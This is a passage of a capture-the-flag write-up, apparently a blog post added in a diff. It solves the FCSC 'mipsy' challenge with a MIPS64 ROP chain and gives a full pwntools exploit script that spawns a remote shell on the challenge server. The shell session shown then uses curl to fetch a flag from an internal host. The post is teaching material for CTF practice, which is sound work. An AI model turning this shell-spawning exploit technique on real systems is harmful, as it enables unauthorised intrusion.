+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: s += </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+        <span class="n">s</span> <span class="o">+=</span> <span class="n">val</span>
+        <span class="k">return</span> <span class="n">s</span>
+    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">pos</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: </span><span class="si">{</span><span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span>
+        <span class="k">return</span> <span class="n">s</span> 
+    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">pos</span><span class="p">:</span>
+        <span class="n">k</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: </span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">+</span> <span class="n">val</span>
+</code></pre></div><p>It&rsquo;s very useful because we are then able to give the right offset about the stack pointer when we execute the gadgets.
+We can begin by overwriting the value of the saved <code>$gp</code> and <code>$ra</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">GP</span> <span class="o">=</span> <span class="mh">0x120048020</span>
+<span class="n">BASE_RSP</span> <span class="o">=</span> <span class="mh">0x90</span>
+
+<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">GP</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># $gp</span>
+<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V1</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span> <span class="c1"># $ra</span>
+</code></pre></div><p>BASE_RSP is the offset of the input&rsquo;s buffer about the <code>$sp</code> address when we return and so when we start to execute some gadgets.
+We indicate the gadget to execute which is the gadget which sets <code>$v1</code> register to zero.</p>
+<p>Then we can put the right value in <code>$v1</code> by looking at the SET_V1 gadget which loads the doubleword in <code>0x80($sp)</code> in <code>$v1</code>.
+So we have to add to our payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span> <span class="c1"># $v1</span>
+</code></pre></div><p>And we have to set the right value for the next gadget to execute. The gadget loads the doubleword in <code>0xe0($sp)</code> in <code>$t9</code> and then jmp on, so we can add our SET_V0 gadget to be then executed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span> <span class="c1"># $t9</span>
+</code></pre></div><p>We repeat the same operation for the SET_V0 gadget by setting a pointer to <code>'/bin/sh'</code> in <code>0x210($sp)</code> and the address of the final execve call in <code>0x228($sp)</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x210</span><span class="p">))</span> <span class="c1"># $v0</span>
+<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">EXECVE</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x228</span><span class="p">))</span> <span class="c1"># $t9</span>
+</code></pre></div><p>We finished the ROPchain, now we just have to send it to the server and to enjoy the shell !</p>
+<p>The final script looks like such:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">ELF</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">remote</span><span class="p">,</span> <span class="n">p64</span> 
+
+<span class="n">BINSH</span> <span class="o">=</span> <span class="mh">0x120025A20</span>
+
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;mipsy&#39;</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">=</span> <span class="mi">64</span> <span class="c1"># mips64</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;mips&#34;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&#34;big&#34;</span> <span class="c1"># Not a mipsel binary</span>
+
+<span class="k">def</span> <span class="nf">make_pld</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="n">pos</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">+=</span> <span class="n">val</span>
+        <span class="k">return</span> <span class="n">s</span>
+    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">pos</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span>
+        <span class="k">return</span> <span class="n">s</span> 
+    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">pos</span><span class="p">:</span>
+        <span class="n">k</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">+</span> <span class="n">val</span> 
+
+<span class="n">SET_V0</span> <span class="o">=</span> <span class="mh">0x12001B4D8</span> <span class="c1"># : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6</span>
+
+<span class="n">SET_V1</span> <span class="o">=</span> <span class="mh">0x000000012001270c</span> <span class="c1"># : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)</span>
+
+<span class="n">EXECVE</span> <span class="o">=</span> <span class="mh">0x120004134</span>
+
+<span class="n">GP</span> <span class="o">=</span> <span class="mh">0x120048020</span>
+<span class="n">BASE_RSP</span> <span class="o">=</span> <span class="mh">0x90</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span><span class="p">,</span> <span class="mi">4005</span><span class="p">)</span>
+    <span class="c1"># return remote(&#34;localhost&#34;, 4000)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;] &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+
+<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">GP</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># $gp</span>
+<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V1</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span> <span class="c1"># $ra</span>
+<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span> <span class="c1"># $v1</span>
+<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span> <span class="c1"># $t9</span>
+<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x210</span><span class="p">))</span> <span class="c1"># $v0</span>
+<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">EXECVE</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x228</span><span class="p">))</span> <span class="c1"># $t9</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h2 id="final-part">
+        Final part
+        <a data-clipboard-text="http://n4sm.github.io/posts/mipsy/#final-part" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final part" href="#final-part">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>According to the statements we need to read some files stored on the filer machine.
+So firstly let&rsquo;s run the exploit to get the shell:</p>
+<pre tabindex="0"><code>$ ./solve.py                                                                  
+[!] Could not emulate PLT instructions for ELF('mipsy/mipsy')
+[!] Could not populate PLT: not enough values to unpack (expected 2, got 0)
+[*] 'mipsy/mipsy'
+    Arch:     mips64-64-big
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x120000000)
+    RWX:      Has RWX segments
+[+] Opening connection to challenges2.france-cybersecurity-challenge.fr on port 4005: Done
+[*] Switching to interactive mode
+Error: wrong password.
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ ls
+list_interfaces.sh
+mipsy
+$
+</code></pre><p>We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:</p>
+<pre tabindex="0"><code>$ curl filer
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+&lt;title&gt;Directory listing for /&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Directory listing for /&lt;/h1&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;flag&quot;&gt;flag&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>It&rsquo;s a directory listing of the files stored in filer, and so we just have to <code>curl filer/flag</code> to get the flag:</p>
+<pre tabindex="0"><code>$ curl filer/flag
+FCSC{82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519}
+</code></pre><p>And we got the flag !
+This challenge was very cool because it&rsquo;s a &ldquo;real world&rdquo; scenario and it makes me discovering mips assembly !</p>
+
+    </section>
+  </article>
+
+      </main>
+
+      <footer class="gblog-footer">
+  <nav class="container flex">
+    <div>
+      <section class="flex flex-wrap align-center">
+        
+          <span class="gblog-footer__item gblog-footer__item--row">
+            <svg class="icon gblog_rss_feed"><use xlink:href="#gblog_rss_feed"></use></svg>
+            <a href="/feed.xml" class="gblog-footer__link">Atom Feed</a>
+          </span>
+        
+        
+          
+
+  
+  
+  
+
+  
+    
+      
+      
+      
+
+      
+        <span class="gblog-footer__item gblog-footer__item--row">
+          
+            <svg class="icon gblog_email"><use xlink:href="#gblog_email"></use></svg>
+          
+          <a
+            href="
+              /
+            "
+            class="gblog-footer__link"
+          >
+            Contact
+          </a>
+        </span>
+      
+    
+  
+
+
+
+
+
+
+        
+        
+        
+      </section>
+      <section class="flex flex-wrap align-center">
+        <span class="gblog-footer__item">
+          Built with <a href="https://gohugo.io/" class="gblog-footer__link">Hugo</a> and
+          <svg class="icon gblog_heart"><use xlink:href="#gblog_heart"></use></svg>
+        </span>
+      </section>
+      
+      
+        <section class="flex flex-wrap align-center">
+          <span class="gblog-footer__item">
+            Content licensed under
+            <a href="https://spdx.org/licenses/Beerware.html" class="gblog-footer__link no-wrap">Beerware license</a>
+          </span>
+        </section>
+      
+    </div>
+    
+      <div class="flex flex-25 justify-end">
+        <span class="gblog-footer__item text-right">
+          <a class="gblog-footer__link fake-link" href="#" aria-label="Back to top">
+            <svg class="icon gblog_keyborad_arrow_up">
+              <use xlink:href="#gblog_keyborad_arrow_up"></use>
+            </svg>
+            <span class="hidden-mobile">Back to top</span>
+          </a>
+        </span>
+      </div>
+    
+  </nav>
+</footer>
+
+    </div>
+  </body>
+</html>
